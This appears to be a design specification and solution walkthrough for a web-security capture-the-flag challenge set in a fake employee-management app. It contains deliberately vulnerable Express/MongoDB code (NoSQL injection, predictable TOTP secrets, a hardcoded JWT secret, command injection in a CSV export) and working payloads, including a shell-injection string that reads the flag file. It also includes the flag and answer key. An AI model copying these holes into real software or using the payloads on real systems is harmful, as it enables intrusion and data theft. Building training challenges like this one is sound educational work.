sud# SecureVault Pro CTF Challenge - Technical Specification

## 🎯 Challenge Overview

A multi-stage web security CTF challenge simulating a corporate employee management system with cascading vulnerabilities. Participants must chain exploits through NoSQL injection, bypass weak 2FA, and ultimately retrieve the flag from the admin panel.

**Challenge Name:** SecureVault Pro  
**Category:** Web Security  
**Difficulty:** Medium-Hard  
**Points:** 400-500  
**Flag:** `CTF{n0sql_2fa_byp4ss_m4st3r_2024}`

## 🏗️ System Architecture

```mermaid
graph TB
    subgraph "Attack Flow"
        A[Stage 1: Recon] --> B[Discovery Phase]
        B --> C[NoSQL Injection]
        C --> D[Extract Admin Creds]
        D --> E[Stage 2: 2FA]
        E --> F[Weak TOTP Analysis]
        F --> G[Bypass 2FA]
        G --> H[Stage 3: Admin Panel]
        H --> I[Final Exploitation]
        I --> J[Capture Flag]
    end
    
    subgraph "Technology Stack"
        K[Node.js/Express]
        L[MongoDB]
        M[Speakeasy TOTP]
        N[JWT Auth]
        O[React Frontend]
    end
    
    subgraph "Vulnerabilities"
        P[Debug Endpoint Exposed]
        Q[NoSQL Injection]
        R[Weak TOTP Seed]
        S[JWT Secret in localStorage]
        T[Command Injection]
    end
    
    style J fill:#51cf66
    style P fill:#ff6b6b
    style Q fill:#ff6b6b
    style R fill:#ff6b6b
    style S fill:#ff6b6b
    style T fill:#ff6b6b
```

## 📋 Attack Chain Flow

```mermaid
sequenceDiagram
    participant H as Hacker
    participant W as Web App
    participant API as API Server
    participant DB as MongoDB
    participant 2FA as 2FA System
    participant Admin as Admin Panel
    
    Note over H,Admin: STAGE 1 - Reconnaissance & NoSQL Injection
    H->>W: Browse application
    H->>API: Discover /api/debug endpoint
    API-->>H: Database schema leaked
    H->>W: Login page with email field
    H->>API: POST /api/login {"email": {"$ne": null}}
    API->>DB: Query with NoSQL operator
    DB-->>API: Return admin user
    API-->>H: Admin credentials in response
    
    Note over H,Admin: STAGE 2 - 2FA Bypass
    H->>W: Login with admin creds
    W->>2FA: Request OTP
    2FA-->>W: Show QR code/secret
    H->>H: Analyze weak TOTP seed
    H->>H: Generate valid OTP
    H->>API: POST /api/verify-2fa
    API-->>H: JWT token with admin privileges
    
    Note over H,Admin: STAGE 3 - Admin Panel Exploitation
    H->>Admin: Access /admin dashboard
    Admin-->>H: Show employee management
    H->>Admin: Exploit command injection in export
    Admin-->>H: Execute system commands
    H->>Admin: Read flag from system
```

## 💻 Technical Implementation Details

### Stage 1: Discovery & NoSQL Injection

#### Debug Endpoint (Information Disclosure)
```javascript
// VULNERABILITY: Exposed debug endpoint
// Located at: /api/debug/schema
app.get('/api/debug/schema', (req, res) => {
  // Developer comment: "TODO: Remove before production"
  res.json({
    database: 'securevault_prod',
    collections: {
      users: {
        fields: ['_id', 'email', 'password', 'role', 'totpSecret', 'isAdmin'],
        indexes: ['email'],
        adminUser: 'admin@securevault.local' // Hint in response
      },
      sessions: ['_id', 'userId', 'token', 'expiresAt'],
      employees: ['_id', 'name', 'department', 'salary', 'ssn']
    },
    version: '2.1.0',
    debugMode: true
  });
});
```

#### NoSQL Injection Vulnerability
```javascript
// VULNERABILITY: Direct query object passing
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  
  // Vulnerable code - accepts objects
  const user = await User.findOne({ 
    email: email,  // Can be {"$ne": null}
    password: password  // Can be {"$ne": null}
  });
  
  if (user) {
    // Accidentally returns full user object including totpSecret
    res.json({
      success: true,
      message: "Credentials valid. Please complete 2FA.",
      user: {
        email: user.email,
        role: user.role,
        // DEBUG: Remove in production
        _debug_totpSecret: user.totpSecret, // Weak: returns TOTP secret
        requiresTwoFactor: true
      }
    });
  }
});
```

### Stage 2: Two-Factor Authentication Bypass

#### Weak TOTP Implementation
```javascript
// VULNERABILITY: Predictable TOTP secret generation
const generateTOTPSecret = (email) => {
  // Weak: Uses MD5 hash of email as secret
  const crypto = require('crypto');
  const baseSecret = crypto.createHash('md5')
    .update(email + "_securevault_2024")
    .digest('hex');
  
  return {
    base32: base32.encode(Buffer.from(baseSecret.substring(0, 20))),
    otpauth_url: speakeasy.otpauthURL({
      secret: baseSecret.substring(0, 20),
      label: email,
      issuer: 'SecureVault',
      encoding: 'base32'
    })
  };
};

// VULNERABILITY: Loose time window
app.post('/api/verify-2fa', async (req, res) => {
  const { email, token } = req.body;
  const user = await User.findOne({ email });
  
  const verified = speakeasy.totp.verify({
    secret: user.totpSecret,
    encoding: 'base32',
    token: token,
    window: 10  // VULNERABILITY: 10 time windows = 5 minutes!
  });
  
  if (verified) {
    // VULNERABILITY: JWT secret stored in response
    const jwtToken = jwt.sign(
      { email, role: user.role, isAdmin: user.isAdmin },
      process.env.JWT_SECRET || 'dev_secret_key_2024'
    );
    
    res.json({
      success: true,
      token: jwtToken,
      // Debug info leaking JWT structure
      _debug: {
        algorithm: 'HS256',
        secret_hint: 'Check localStorage after login'
      }
    });
    
    // Client-side will store JWT secret in localStorage (bad practice)
  }
});
```

### Stage 3: Admin Panel Exploitation

#### Command Injection in Export Feature
```javascript
// VULNERABILITY: Command injection in CSV export
app.post('/api/admin/export-employees', authenticateAdmin, async (req, res) => {
  const { format, filter } = req.body;
  
  if (format === 'csv') {
    // VULNERABILITY: Unsanitized filter parameter
    const command = `mongoexport --db securevault_prod --collection employees --query '${filter}' --type=csv`;
    
    exec(command, (error, stdout, stderr) => {
      if (error) {
        // Error messages leak system information
        res.status(500).json({ 
          error: error.message,
          stderr: stderr,
          hint: "Filter parameter might be useful for more than filtering..."
        });
        return;
      }
      res.send(stdout);
    });
  }
});
```

#### Hidden Flag Endpoint
```javascript
// Flag hidden in multiple locations
app.get('/api/admin/system-info', authenticateAdmin, (req, res) => {
  res.json({
    version: '2.1.0',
    // Flag piece 1 in HTML comment
    comment: "<!-- Part 1: CTF{n0sql_ -->",
    env: process.env.NODE_ENV
  });
});

// Flag piece 2 in JavaScript file
// public/js/admin.js contains:
// console.debug("System initialized with flag piece: 2fa_byp4ss_");

// Flag piece 3 through command injection
// File at /tmp/flag.txt contains: "m4st3r_2024}"
```

## 🔒 Vulnerability Summary

### Primary Vulnerabilities

1. **Information Disclosure**
   - Debug endpoint exposes database schema
   - Error messages leak system information
   - Comments in source code provide hints

2. **NoSQL Injection**
   - Direct object passing to MongoDB queries
   - Authentication bypass using $ne operator
   - Sensitive data exposure in responses

3. **Weak 2FA Implementation**
   - Predictable TOTP secret generation (MD5 of email)
   - Excessive time window (10 periods = 5 minutes)
   - TOTP secret leaked in login response
   - Client-side validation bypass possible

4. **JWT Vulnerabilities**
   - Weak/predictable secret key
   - Secret stored in localStorage
   - Debug information reveals JWT structure

5. **Command Injection**
   - Unsanitized user input in system commands
   - CSV export feature with filter parameter
   - Direct command execution

## 📁 Project Structure

```
Web/vibe_slep/
├── docker-compose.yml
├── Dockerfile
├── README.md
├── specification.md
├── .env.example
├── package.json
├── server/
│   ├── app.js                 # Main Express application
│   ├── config/
│   │   ├── database.js        # MongoDB connection
│   │   ├── auth.js            # JWT configuration
│   │   └── totp.js            # TOTP settings
│   ├── models/
│   │   ├── User.js            # User schema
│   │   ├── Employee.js        # Employee schema
│   │   └── Session.js         # Session management
│   ├── routes/
│   │   ├── auth.js            # Authentication routes
│   │   ├── api.js             # API endpoints
│   │   ├── admin.js           # Admin panel routes
│   │   └── debug.js           # Debug endpoints (vulnerability)
│   ├── middleware/
│   │   ├── authenticate.js    # JWT verification
│   │   └── validate.js        # Input validation (weak)
│   └── utils/
│       ├── crypto.js          # Weak crypto functions
│       └── logger.js          # Logging (verbose)
├── client/
│   ├── public/
│   │   ├── index.html         # Landing page
│   │   ├── login.html         # Login page
│   │   ├── dashboard.html     # User dashboard
│   │   ├── admin.html         # Admin panel
│   │   └── favicon.ico
│   ├── src/
│   │   ├── components/
│   │   │   ├── LoginForm.js
│   │   │   ├── TOTPVerify.js
│   │   │   ├── EmployeeList.js
│   │   │   └── ExportPanel.js
│   │   ├── services/
│   │   │   ├── api.js         # API client
│   │   │   └── auth.js        # Auth service (stores JWT in localStorage)
│   │   └── App.js
│   └── css/
│       └── style.css          # Corporate theme
├── database/
│   ├── init.js                # Database initialization
│   ├── seed.js                # Seed data with admin user
│   └── schemas/               # MongoDB schemas
└── flag/
    └── flag.txt               # Final flag piece

```

## 🐳 Docker Configuration

### docker-compose.yml
```yaml
version: '3.8'

services:
  mongodb:
    image: mongo:6.0
    container_name: securevault-db
    environment:
      MONGO_INITDB_ROOT_USERNAME: admin
      MONGO_INITDB_ROOT_PASSWORD: admin123
      MONGO_INITDB_DATABASE: securevault_prod
    volumes:
      - ./database/init.js:/docker-entrypoint-initdb.d/init.js
      - mongodb_data:/data/db
    ports:
      - "27017:27017"
    networks:
      - securevault-network

  app:
    build: .
    container_name: securevault-app
    depends_on:
      - mongodb
    environment:
      NODE_ENV: production
      MONGODB_URI: mongodb://admin:admin123@mongodb:27017/securevault_prod?authSource=admin
      JWT_SECRET: dev_secret_key_2024
      PORT: 3000
      DEBUG_MODE: "true"  # Intentionally left on
      FLAG: "CTF{n0sql_2fa_byp4ss_m4st3r_2024}"
    volumes:
      - ./flag:/tmp/flag
    ports:
      - "3000:3000"
    networks:
      - securevault-network

networks:
  securevault-network:
    driver: bridge

volumes:
  mongodb_data:
```

## 🎮 Solution Walkthrough

### Stage 1: Discovery and NoSQL Injection

1. **Reconnaissance**
   ```bash
   # Discover debug endpoint
   curl http://localhost:3000/api/debug/schema
   # Returns database structure and admin email hint
   ```

2. **NoSQL Injection Attack**
   ```bash
   # Bypass authentication
   curl -X POST http://localhost:3000/api/login \
     -H "Content-Type: application/json" \
     -d '{"email": {"$ne": null}, "password": {"$ne": null}}'
   
   # Response includes admin user with TOTP secret
   ```

### Stage 2: 2FA Bypass

3. **Analyze TOTP Implementation**
   ```python
   import hashlib
   import pyotp
   
   # Generate predictable TOTP secret
   email = "admin@securevault.local"
   secret_base = hashlib.md5(f"{email}_securevault_2024".encode()).hexdigest()
   secret = secret_base[:20]
   
   # Generate valid OTP
   totp = pyotp.TOTP(base32.b32encode(secret.encode()))
   current_otp = totp.now()
   ```

4. **Submit OTP**
   ```bash
   curl -X POST http://localhost:3000/api/verify-2fa \
     -H "Content-Type: application/json" \
     -d '{"email": "admin@securevault.local", "token": "'$current_otp'"}'
   ```

### Stage 3: Admin Panel Exploitation

5. **Access Admin Panel**
   ```bash
   # Use JWT token from previous step
   curl -H "Authorization: Bearer $JWT_TOKEN" \
     http://localhost:3000/api/admin/dashboard
   ```

6. **Command Injection**
   ```bash
   # Exploit CSV export feature
   curl -X POST http://localhost:3000/api/admin/export-employees \
     -H "Authorization: Bearer $JWT_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"format": "csv", "filter": "{}'; cat /tmp/flag/flag.txt; echo '"}'
   ```

7. **Combine Flag Pieces**
   - Part 1: From HTML comment in system-info
   - Part 2: From JavaScript console in admin.js  
   - Part 3: From command injection reading flag.txt
   - Complete: `CTF{n0sql_2fa_byp4ss_m4st3r_2024}`

## 🎯 Hints System

### Progressive Hints (Released over time)

**Hint 1** (After 30 minutes):
- HTTP Response Header: `X-Debug-Mode: enabled`
- Message: "Development endpoints might still be accessible"

**Hint 2** (After 1 hour):
- Error message includes: "MongoDB operators are powerful tools"
- Source comment: `// TODO: Sanitize user input before querying`

**Hint 3** (After 2 hours):
- Console log: "TOTP secrets should be truly random"
- Debug response: "Check how the TOTP secret is generated"

**Hint 4** (After 3 hours):
- Admin panel comment: "CSV export accepts custom filters"
- Error reveals: "Command execution is enabled for exports"

## 🧪 Testing Checklist

- [ ] Debug endpoint accessible and leaks information
- [ ] NoSQL injection bypasses authentication
- [ ] Admin credentials exposed in response
- [ ] TOTP secret is predictable
- [ ] 2FA bypass works with generated OTP
- [ ] JWT token grants admin access
- [ ] Command injection in export feature works
- [ ] Flag pieces are retrievable
- [ ] No unintended solutions exist
- [ ] Docker environment runs correctly
- [ ] All hints appear at correct times

## 📚 Educational Value

### Concepts Covered

1. **Reconnaissance & Information Gathering**
   - Debug endpoint discovery
   - Schema enumeration
   - Information leakage

2. **NoSQL Injection**
   - MongoDB query operators
   - Authentication bypass
   - Data extraction techniques

3. **Two-Factor Authentication Weaknesses**
   - TOTP implementation flaws
   - Predictable secret generation
   - Time window attacks

4. **JWT Security**
   - Token structure and manipulation
   - Secret key security
   - Storage vulnerabilities

5. **Command Injection**
   - Input sanitization bypass
   - System command execution
   - Privilege escalation

## 🔧 Configuration Files

### .env.example
```env
# Server Configuration
NODE_ENV=production
PORT=3000
HOST=0.0.0.0

# MongoDB
MONGODB_URI=mongodb://localhost:27017/securevault_prod
DB_NAME=securevault_prod

# Security (Intentionally Weak)
JWT_SECRET=dev_secret_key_2024
JWT_EXPIRY=24h
TOTP_WINDOW=10
DEBUG_MODE=true

# CTF Flag
FLAG_PART_1=CTF{n0sql_
FLAG_PART_2=2fa_byp4ss_
FLAG_PART_3=m4st3r_2024}

# Logging
LOG_LEVEL=debug
LOG_FILE=./logs/app.log
```

## 📝 Deployment Notes

### Prerequisites
- Docker and Docker Compose
- Node.js 18+ (for local development)
- MongoDB 6.0+
- 2GB RAM minimum
- Port 3000 and 27017 available

### Quick Start
```bash
# Clone repository
cd Web/vibe_slep

# Build and run
docker-compose up -d

# Verify services
docker-compose ps

# Check logs
docker-compose logs -f

# Access application
open http://localhost:3000
```

### Monitoring
- MongoDB logs: `docker-compose logs mongodb`
- Application logs: `docker-compose logs app`
- Flag access attempts: Check application logs for admin panel access

## 🏆 Success Metrics

- **Target Solve Time**: 45-90 minutes
- **Expected Success Rate**: 30-40% for intermediate players
- **Skills Required**: 
  - Web reconnaissance
  - NoSQL injection
  - TOTP/2FA understanding
  - Basic cryptography
  - Command injection

---

**Author**: CTF Development Team  
**Version**: 1.0.0  
**Last Updated**: December 2024  
**Difficulty**: Medium-Hard (3.5/5)